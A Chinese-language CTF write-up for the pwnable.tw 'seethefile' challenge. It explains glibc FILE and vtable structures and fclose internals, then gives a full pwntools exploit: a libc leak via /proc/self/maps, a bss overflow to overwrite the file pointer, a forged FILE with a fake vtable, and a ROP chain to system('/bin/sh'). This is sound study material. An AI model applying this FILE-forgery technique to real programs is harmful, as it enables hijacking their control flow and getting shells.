---
layout: post
title: pwnable.tw seethefile
date: 2023-05-07 12:44:10
tags: pwnable.tw
---

借本题入门了glibc的FILE相关机制，果然一切涉及到函数指针的设计都是灵活但危险的。

本题相关：FILE伪造、vtable伪造、fclose

---

## 漏洞分析

保护情况：

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

程序大致是一个menu，可以选择以下几种功能：
1. open：指定文件名打开文件，将FILE\*保存到bss段的fp（不允许文件名中含有flag子字符串）
2. read：从fp中读取0x18F个字节，并保存到bss段的magic_buffer中
3. write：将magic_buffer中的内容打印到屏幕上（不允许内容中含有flag、}）
4. close：关闭fp
5. exit：往bss读取一串字符串（name）后，尝试fclose(fp)并退出

程序漏洞点有两个：
1. main函数读取选项时，使用了 `scanf("%s", buf)`，其中buf是一个栈变量。
2. main函数在exit读取name时，也使用了 `scanf("%s", name)`，其中name在bss段上，且fp在它的后面。

由于main函数没有ret，只有exit，因此我们没办法使用第一个漏洞来劫持程序控制流。
但第二个漏洞非常有用，我们可以通过溢出name来覆写fp指针，通过伪造FILE结构体和vtable的方式，我们可以让fclose调用某个给定的地址的代码，从而劫持程序控制流。

此外，还有一个不太算漏洞的疏忽，就是我们可以通过读取 `/proc/self/maps` 来得到程序各个段的地址。虽然read一次只能读取0x18F个字节，但是由于文件流在下一次读取时会接着读，所以我们是可以获取完整的文件内容的。

## FILE 结构体分析

在glibc中，有三个初始文件流直接位于glibc的数据段，是stdin、stdout和stderr。当用户使用fopen打开新的文件时，FILE结构体会使用malloc分配到程序的堆上。

FILE结构体的定义位于 `libio/libio.h`，在2.23-0ubuntu3版本中如下：

```c
struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

不过完整的FILE结构还多一个word，用来存放一个函数指针表vtable，这是为了与C++的streambuf兼容，在 `libio/libioP.h` 中可以找到其定义：

```c
/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */

struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

## fclose 分析

声明在 `include/stdio.h` 中：

```c
extern int _IO_new_fclose (_IO_FILE*);
#   define fclose(fp) _IO_new_fclose (fp)
```

定义在 `libio/iofclose.c` 中，比较重要的是下面几行：

```c
/* First unlink the stream.  */
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);

  _IO_acquire_lock (fp);
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    status = _IO_file_close_it (fp);
  else
    status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;
  _IO_release_lock (fp);
  _IO_FINISH (fp);
```

与lock相关的代码实在是太复杂了，现在的我还没有宏孩儿的功力，因此只能暂且作罢。事实证明这题里面不用管它。

那么有两种攻击方法：一种是通过_IO_file_close_it调用vtable中的 `__close`；一种是通过_IO_FINISH（定义见下）调用vtable中的 `__finish`。

```c
#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)
```

我使用的是后者，因为比较简单，但第一个方法看上去也是非常可行的。
具体来说，只要把 `_IO_IS_FILEBUF` flag置零，就可以跳过unlink和close_it，调用到finish。

## 漏洞利用

既然栈上可以随便溢出，那我就寻思着想办法来个ROP！
我们可以使用上述方法劫持程序控制流来执行一次给定地址的代码，因此我的思路就是找一个长得像这样的gadget，直接将栈“迁移”到我可以控制的位置：`add esp, xxx; ret`

在本地调试时，在调用 `__finish` 后的第一条指令处停下，然后查看此时栈的情况：

```
pwndbg> stack 30
00:0000│ esp 0xffffcafc —▸ 0xf7e79fa8 (fclose+232) ◂— mov edx, dword ptr [esi + 0x68]
01:0004│     0xffffcb00 —▸ 0x804c410 ◂— 0xfbad240c
02:0008│     0xffffcb04 ◂— 0x0
03:000c│     0xffffcb08 —▸ 0xf7e5ebcb (vfprintf+11) ◂— add ebx, 0x16e435
04:0010│     0xffffcb0c ◂— 0x0
05:0014│     0xffffcb10 —▸ 0xf7fe76eb (_dl_fixup+11) ◂— add esi, 0x15915
06:0018│     0xffffcb14 ◂— 0x0
07:001c│     0xffffcb18 —▸ 0xf7fcd000 ◂— 0x1afdb0
08:0020│     0xffffcb1c —▸ 0xf7fcd000 ◂— 0x1afdb0
09:0024│     0xffffcb20 —▸ 0xffffcb88 ◂— 0x0
0a:0028│     0xffffcb24 —▸ 0xf7fedf10 (_dl_runtime_resolve+16) ◂— pop edx
0b:002c│     0xffffcb28 —▸ 0xf7e79ecb (fclose+11) ◂— add ebx, 0x153135
0c:0030│     0xffffcb2c ◂— 0x0
0d:0034│     0xffffcb30 —▸ 0xf7fcd000 ◂— 0x1afdb0
0e:0038│     0xffffcb34 —▸ 0xf7fcd000 ◂— 0x1afdb0
0f:003c│ ebp 0xffffcb38 —▸ 0xffffcb88 ◂— 0x0
10:0040│     0xffffcb3c —▸ 0x8048b14 (main+221) ◂— add esp, 0x10
11:0044│     0xffffcb40 —▸ 0x804c410 ◂— 0xfbad240c
12:0048│     0xffffcb44 —▸ 0x804b260 (name) ◂— '114514'
13:004c│     0xffffcb48 —▸ 0xffffcb88 ◂— 0x0
14:0050│     0xffffcb4c —▸ 0x8048a62 (main+43) ◂— sub esp, 8
15:0054│     0xffffcb50 ◂— 0x1
16:0058│     0xffffcb54 ◂— 0x8000
17:005c│     0xffffcb58 ◂— 0x5
18:0060│     0xffffcb5c ◂— '5aaaaaaabbbbbbbbccccccccdddddddd'
```

可以发现，此时esp和可控的位置之间相差了 0x60 个字节。于是我在libc中找到了这个gadget：

```
# 0x0005ae90 : xor eax, eax ; add esp, 0x6c ; ret
```

有了这个gadget，我们就可以愉快地ROP了！直接 system("/bin/sh") 就行。

### 结构体伪造

首先要伪造的是FILE结构体，其中我们需要关注的是flags字段和vtable字段。使用pwntools的API可以超级方便地完成这一步：

```python
    # fake file
    fileStr = FileStructure()
    fileStr.flags=0xffffdfff    # no _IO_IS_FILEBUF
    fileStr.vtable=0x0804B260   # name
```

根据vtable的定义，`__finish` 位于第三个指针处，在32位下就是0x8偏移处，因此我把它就直接放在name的地方。

最终伪造目标是这样（Fake Vtable除了__finish以外的值都不需要关心，因此我随意地在这里放了一个/bin/sh字符串）：

```
Name ─────►┌─────────────────┐ ─┬─
     Fake  │/bin/sh\0        │  │
     Vtable├────────┬────────┤  │
           │__finish│        │  │
           ├────────┴────────┤  │ 0x20
           │                 │  │
           │                 │  │
           │                 │  │
  fp ─────►├────────┬────────┤ ─┴─
           │fp+0x10 │        │
           ├────────┘        │
           │                 │
     ─────►├─────────────────┤
     Fake  │ Flag            │
     FILE

           ├─────────────────┤
           │(vtable)&name    │
           └─────────────────┘
```

### EXP脚本

细节：泄露libc时，由于buffer长度问题，libc基址不会在第一次就读取出来。但是我发现这一地址就是libc基址减去0x1000的偏移，因此我在这里加上0x1000就可以完成泄露。（一开始没发现这个，一位这个地址就是libc基址，因此卡了好久好久……）

最后输入选项的时候，payload以5开头，后面是ROP gadget。这样 `atoi(payload)` 的结果就是5，也就是选择exit功能。

```python
# 0x0005ae90 : xor eax, eax ; add esp, 0x6c ; ret

def pwn():

    # leak libc_addr
    io.sendlineafter(b"Your choice :", b"1")
    io.sendlineafter(b"see", b"/proc/self/maps")
    io.sendlineafter(b"Your choice :", b"2")
    io.sendlineafter(b"Your choice :", b"3")
    io.recvuntil(b"[heap]\n")
    libc_base = int(io.recvuntil(b"-")[:-1].decode(), 16) + 0x1000
    success("libc_base -> "+hex(libc_base))
    # libc_base = int(input("addr:"), 16)

    # create rop chain
    payload = b"5" + b"a"*0xb
    # payload += pack(elf.symbols["puts"]) + pack(0) + pack(0x08048C90) # test
    payload += pack(libc_base + libc.symbols["system"]) + pack(0) + pack(0x0804B260)

    # fake file
    fileStr = FileStructure()
    fileStr.flags=0xffffdfff    # no _IO_IS_FILEBUF
    fileStr.vtable=0x0804B260

    name = b'/bin/sh\0' + pack(libc_base + 0x0005ae90)  # fake vtable
    name += b'a'*0x14
    name += pack(0x0804B280+0x10)+b'a'*0xc  # fake FILE pointer
    name += bytes(fileStr)
    
    io.sendlineafter(b"Your choice :", payload)
    io.sendlineafter(b"name", name)

    io.interactive()
```

后记：后来发现其实根本不用ROP，由于调用vtable中的函数时，参数就是自己的file pointer，所以只要在flag字段后面加上";/bin/sh;"，然后把 `__finish` 设置成system地址，就可以直接get shell。见[R4bb1t师傅的博客](https://n0va-scy.github.io/2019/07/03/pwnable.tw/#seethefile)
